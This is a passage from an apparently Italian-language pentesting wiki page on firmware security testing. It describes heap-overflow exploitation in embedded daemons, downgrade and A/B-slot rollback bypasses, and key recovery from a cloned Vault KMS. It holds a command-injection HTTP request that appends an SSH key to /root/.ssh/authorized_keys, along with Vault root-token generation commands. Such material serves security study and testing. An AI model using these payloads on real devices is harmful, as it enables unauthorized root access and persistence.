- Conferma quali scambi di protocollo legittimi sono necessari per portare il daemon nello stato vulnerabile, invece di dare per scontato che l'handler difettoso sia sempre raggiungibile.

Per i protocolli sensibili alle tempistiche, il replay dei pacchetti da un framework Python potrebbe essere troppo lento. Un approccio più affidabile consiste nell'emulare un dispositivo legittimo su hardware reale (ad esempio un **nRF52840**) con uno stack di livello enterprise, per esporre gli **endpoint**, gli **attributi** e le tempistiche di commissioning corretti.

### Classe di bug nei download frammentati nei daemon embedded

Una classe ricorrente di bug firmware si verifica nei download frammentati di blob/modelli/configurazioni:<sup>[[8]](#references)</sup>

1. Il **primo frammento** (`offset == 0`) memorizza `ctx->total_size` e alloca `malloc(total_size)`.
2. I frammenti successivi convalidano solo i campi **locali al pacchetto** controllati dall'attaccante, come `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` senza verificare che rientri nella **dimensione allocata originariamente**.

Questo consente all'attaccante di inviare:

- Un primo frammento valido con una dimensione totale dichiarata **ridotta** per forzare una piccola allocazione heap.
- Un frammento successivo con l'**offset previsto** ma un `chunk_len` maggiore.
- Una dimensione locale al pacchetto falsificata che supera i nuovi controlli, pur causando un overflow del buffer allocato in origine.

Quando il percorso vulnerabile è protetto dalla logica di commissioning, lo sfruttamento deve includere un livello sufficiente di **emulazione del dispositivo** per portare il target nello stato previsto di download del modello o del blob prima di inviare i frammenti malformati.

### Trigger di `free()` basati sul protocollo

Nei daemon embedded, il modo più semplice per attivare lo sfruttamento dei metadati heap spesso non è "attendere la pulizia", ma **forzare la gestione degli errori prevista dal protocollo**:<sup>[[8]](#references)</sup>

- Invia frammenti successivi malformati per portare la FSM negli stati di **retry** o **errore**.
- Supera la soglia di retry, in modo che il daemon **azzera il contesto** e liberi il buffer corrotto.
- Usa questo `free()` prevedibile per attivare primitive lato allocator prima che il processo vada in crash per motivi non correlati.

Questo è particolarmente utile contro allocator **musl/uClibc/dlmalloc-like** in Linux embedded, dove la corruzione dei metadati dei chunk può trasformare la logica unlink/unbin in una primitiva di scrittura. Una tecnica stabile consiste nel corrompere un **campo size** per reindirizzare l'attraversamento dell'allocator verso **fake chunk predisposti nel buffer in overflow**, invece di sovrascrivere subito puntatori reali alle bin e mandare in crash il processo.

## Sfruttamento binario e proof of concept

Lo sviluppo di un PoC per vulnerabilità identificate richiede una profonda conoscenza dell'architettura target e la programmazione in linguaggi di basso livello. Le protezioni del runtime binario sono rare nei sistemi embedded, ma quando sono presenti potrebbero rendersi necessarie tecniche come Return Oriented Programming (ROP).

### Note sullo sfruttamento dei fastbin uClibc (Linux embedded)

- **Fastbin + consolidamento:** uClibc usa fastbin simili a quelli di glibc. Una successiva allocazione grande può attivare `__malloc_consolidate()`, quindi qualsiasi fake chunk deve superare i controlli (size plausibile, `fd = 0` e chunk circostanti considerati "in uso").<sup>[[6]](#references)</sup>
- **Binari non-PIE con ASLR:** se ASLR è abilitato ma il binario principale è **non-PIE**, gli indirizzi `.data/.bss` interni al binario sono stabili. Puoi puntare a una regione che assomiglia già a un header di chunk heap valido per far finire un'allocazione fastbin su una **tabella di puntatori a funzione**.
- **NUL che interrompe il parser:** quando viene analizzato JSON, un `\x00` nel payload può interrompere il parsing lasciando i byte successivi controllati dall'attaccante, utili per uno stack pivot/una catena ROP.
- **Shellcode tramite `/proc/self/mem`:** una catena ROP che chiama `open("/proc/self/mem")`, `lseek()` e `write()` può inserire shellcode eseguibile in una mappatura nota e passarvi l'esecuzione.

## Sistemi operativi preconfigurati per l'analisi del firmware

Sistemi operativi come [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) offrono ambienti preconfigurati per i test di sicurezza del firmware, dotati degli strumenti necessari.

## Sistemi operativi preconfigurati per analizzare il firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distribuzione pensata per aiutarti a eseguire valutazioni di sicurezza e pentesting dei dispositivi Internet of Things (IoT). Ti fa risparmiare molto tempo fornendo un ambiente preconfigurato con tutti gli strumenti necessari già installati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo per i test di sicurezza embedded basato su Ubuntu 18.04, con strumenti per i test di sicurezza del firmware preinstallati.

## Attacchi di downgrade del firmware e meccanismi di aggiornamento non sicuri

Anche quando un produttore implementa controlli crittografici della firma delle immagini firmware, spesso **omette la protezione dal rollback (downgrade) della versione**. Se il bootloader o il recovery loader verifica solo la firma con una chiave pubblica incorporata, ma non confronta la *versione* (o un contatore monotono) dell'immagine installata, un attaccante può installare legittimamente un **firmware più vecchio e vulnerabile con una firma ancora valida**, reintroducendo così vulnerabilità già corrette.<sup>[[4]](#references)</sup>

Flusso di attacco tipico:

1. **Ottieni un'immagine firmata più vecchia**
   * Scaricala dal portale pubblico di download, dalla CDN o dal sito di supporto del produttore.
   * Estraila dalle applicazioni mobile/desktop associate (ad esempio da `assets/firmware/` all'interno di un APK Android).
   * Recuperala da repository di terze parti come VirusTotal, archivi Internet, forum ecc.
2. **Carica o servi l'immagine al dispositivo** attraverso un canale di aggiornamento esposto:
   * UI web, API dell'app mobile, USB, TFTP, MQTT ecc.
   * Molti dispositivi IoT consumer espongono endpoint HTTP(S) *non autenticati* che accettano blob firmware codificati in Base64, li decodificano lato server e attivano il ripristino o l'aggiornamento.
3. Dopo il downgrade, sfrutta una vulnerabilità corretta in una release più recente (ad esempio un filtro contro la command injection aggiunto in seguito).
4. Se necessario, installa nuovamente l'immagine più recente o disabilita gli aggiornamenti per evitare di essere rilevato dopo aver ottenuto la persistenza.

### Esempio: command injection dopo il downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Nel firmware vulnerabile (con versione retrocessa), il parametro `md5` viene concatenato direttamente a un comando shell senza alcuna sanitizzazione, consentendo l’iniezione di comandi arbitrari (in questo caso, abilitando l’accesso root tramite chiavi SSH). Le versioni successive del firmware hanno introdotto un filtro di base sui caratteri, ma l’assenza di protezione dal downgrade rende inefficace la correzione.<sup>[[4]](#references)</sup>

### Estrazione del firmware dalle app mobili

Molti vendor includono immagini firmware complete nelle app mobili associate, così che l’app possa aggiornare il dispositivo tramite Bluetooth/Wi-Fi. Questi pacchetti sono spesso archiviati senza cifratura nell’APK/APEX, in percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra` o persino il semplice `unzip` consentono di estrarre immagini firmate senza accedere all’hardware fisico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass anti-rollback solo nell’updater nei design con slot A/B

Alcuni vendor implementano un **ratchet** anti-downgrade, ma solo nella logica dell’*updater* (per esempio, una routine UDS su CAN, un comando di recovery o un agente OTA in userspace). Se in seguito il **bootloader** controlla solo la firma/CRC dell’immagine e si fida della tabella delle partizioni o dei metadati degli slot, la protezione dal rollback può ancora essere aggirata.<sup>[[7]](#references)</sup>

Design debole tipico:

- I metadati del firmware contengono sia un descrittore di versione sia un **ratchet di sicurezza** / contatore monotono.
- L’updater confronta il ratchet dell’immagine con un valore salvato nello storage persistente e rifiuta le immagini firmate meno recenti.
- Il bootloader **non** analizza quel ratchet e, prima dell’avvio dello slot selezionato, verifica solo header, CRC e firma.
- L’attivazione dello slot viene registrata separatamente in una tabella delle partizioni o in un contatore di generazione per slot e **non è associata crittograficamente** all’hash esatto del firmware convalidato.

Nei sistemi a doppio slot, questo crea una primitiva **validate-one-image / boot-another-image**. Se l’attaccante riesce a fare in modo che l’updater contrassegni lo slot B come destinazione del prossimo avvio usando un’immagine firmata aggiornata, e poi riesce a sovrascrivere lo slot B prima del riavvio, il bootloader potrebbe comunque avviare l’immagine con downgrade, perché si fida solo dei metadati dello slot già salvati.

Schema di abuso comune:

1. Carica un firmware **firmato e aggiornato** nello slot passivo ed esegui la normale routine di convalida/cambio, in modo che il layout contrassegni quello slot come prossimo slot attivo.
2. **Non riavviare ancora**. Nella stessa sessione, richiama la routine di preparazione/cancellazione dello slot.
3. Sfrutta uno stato di boot obsoleto o una logica di selezione dello slot obsoleta, in modo che l’updater cancelli lo **stesso slot fisico** appena promosso.
4. Scrivi in quello slot un firmware **più vecchio ma ancora firmato**.
5. Salta la routine di convalida che applica il ratchet e riavvia direttamente.
6. Il bootloader seleziona lo slot promosso, verifica solo firma/integrità e avvia la vecchia immagine.

Aspetti da verificare durante il reverse engineering delle implementazioni di aggiornamento A/B:

- Selezione dello slot basata su **flag di boot** che non vengono aggiornati dopo un cambio riuscito.
- Una routine simile a `prepare_passive_slot()` che cancella uno slot usando uno stato obsoleto invece del **layout attualmente salvato**.
- Una funzione simile a `part_write_layout()` che aggiorna solo un **contatore di generazione** / flag di attivazione e non memorizza l’hash dell’immagine convalidata.
- Controlli del ratchet implementati in userspace o nel codice dell’updater, ma **non** in ROM / bootloader / fasi di secure boot.
- Routine di cancellazione o recovery che lasciano lo slot contrassegnato come avviabile anche dopo che il suo contenuto è stato rimosso e riscritto.

### Checklist per valutare la logica di aggiornamento

* Il trasporto e l’autenticazione dell’*endpoint di aggiornamento* sono adeguatamente protetti (TLS + autenticazione)?
* Il dispositivo confronta i **numeri di versione** o un **contatore monotono anti-rollback** prima del flashing?
* L’immagine viene verificata all’interno di una catena di secure boot (per esempio, con le firme controllate dal codice ROM)?
* Il **bootloader applica lo stesso ratchet** dell’updater, invece di controllare solo firma/CRC?
* I metadati di attivazione dello slot sono **associati alla versione/hash del firmware convalidato**, o è possibile modificare uno slot dopo la promozione?
* Dopo il cambio di slot, il dispositivo è obbligato a riavviarsi oppure nella stessa sessione restano accessibili altre routine di aggiornamento/cancellazione?
* Il codice in userland esegue controlli aggiuntivi di coerenza (per esempio, sulla mappa delle partizioni consentite o sul numero del modello)?
* I flussi di aggiornamento *parziali* o di *backup* riutilizzano la stessa logica di convalida?

> 💡  Se manca uno qualsiasi degli elementi sopra indicati, è probabile che la piattaforma sia vulnerabile agli attacchi di rollback.

## Firmware vulnerabili per esercitarsi

Per esercitarsi a individuare vulnerabilità nel firmware, usa i seguenti progetti di firmware vulnerabili come punto di partenza.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperare le chiavi di decrittazione del firmware dallo stato KMS/Vault integrato

Quando un’immagine di aggiornamento combina piccoli metadati in testo semplice con un grande blob ad alta entropia, analizza prima il container, prima di tentare qualsiasi brute force:<sup>[[1]](#references)</sup>

- Estrai header, offset e interruzioni di riga con `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` di solito indica il formato `enc` di OpenSSL: i successivi 8 byte sono il salt e i byte rimanenti sono il ciphertext.
- Un campo Base64 che, una volta decodificato, contiene esattamente `256` byte è un forte indizio che si tratti di un ciphertext RSA-2048 che avvolge una password/session key casuale del firmware.
- Il materiale PGP separato presente nello stesso file spesso protegge solo l’autenticità; non dare per scontato che venga usato per la riservatezza.

Se la ricerca statica delle chiavi (`grep`, `strings`, ricerche PEM/PGP) non dà risultati, esegui il reverse engineering del **percorso operativo di decrittazione** invece di limitarti a cercare chiavi private:

- Decompila l’updater / il binario di gestione e ricostruisci chi legge il blob cifrato, quale helper/API lo decifra e quale nome logico della chiave richiede.
- Cerca nello root filesystem estratto lo stato KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), oltre ai file unit e agli script init.
- Considera le istruzioni `vault operator unseal ...` in testo semplice, le chiavi di recovery, i token di bootstrap o gli script locali di auto-unseal KMS equivalenti al materiale delle chiavi private.

Se l’appliance include il binario Vault originale e il backend di storage, replicare quell’ambiente è di solito più semplice che reimplementare gli internals di Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con root sul KMS clonato:

- Rendi le transit key esportabili solo all'interno del clone isolato: `vault write transit/keys/<name>/config exportable=true`
- Esporta la chiave di unwrap: `vault read transit/export/encryption-key/<name>`
- Prova la chiave RSA recuperata con la coppia esatta padding/hash usata dal KMS. Un errore di decifratura PKCS#1 v1.5 e un errore di decifratura OAEP predefinita **non** dimostrano che la chiave sia sbagliata: molti flussi basati su Vault usano OAEP con SHA-256, mentre le librerie comuni usano SHA-1 per impostazione predefinita.
- Se il payload inizia con `Salted__`, riproduci esattamente la KDF OpenSSL del vendor (`EVP_BytesToKey`, spesso MD5 sugli appliance legacy) prima di tentare la decifratura AES-CBC.

Questo trasforma il problema del "firmware cifrato" in un problema più generale: **recuperare le chiavi operative lato appliance, quindi riprodurre offline i parametri esatti di unwrap + KDF**.

## Formazione e certificazioni

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Decifrare il firmware con Claude: competenze di livello senior, autonomia di livello junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia di test della sicurezza del firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking pratico dell'IoT: la guida definitiva per attaccare l'Internet delle cose](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Sfruttare zero-day in hardware abbandonato – blog di Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Come un dispositivo smart da 20 $ mi ha dato accesso a casa tua](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ora mi vedi: ora sei stato pwnato](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Sfruttare il Tesla Wall Connector dal connettore della porta di ricarica - Parte 2: aggirare la protezione anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Fallo lampeggiare: exploitation over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS su QEMU, parte 1: estrazione](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentazione del kernel Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS su QEMU, parte 2: debugging e correzione](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Password del BIOS Dell: la debole cifratura XOR consente il recupero dalla memoria flash SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Strumenti per il recupero delle password del BIOS Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
